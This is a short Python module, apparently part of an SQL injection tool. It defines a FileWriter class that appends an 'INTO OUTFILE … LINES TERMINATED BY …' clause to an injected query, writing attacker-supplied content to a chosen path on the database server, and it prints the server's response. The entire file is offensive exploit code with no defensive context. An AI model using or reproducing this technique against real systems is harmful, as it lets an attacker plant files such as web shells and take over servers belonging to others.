from tools import encode_str


class FileWriter:

    def __init__(self, request_builder, content):
        self.request_builder = request_builder
        self.content = content

    def write(self, path):
        r = self.request_builder(self.payload(path, self.content))
        print(r.text)

    def payload(self, path, content):
        return " INTO OUTFILE {} LINES TERMINATED BY {}".format(encode_str(path), encode_str(content))
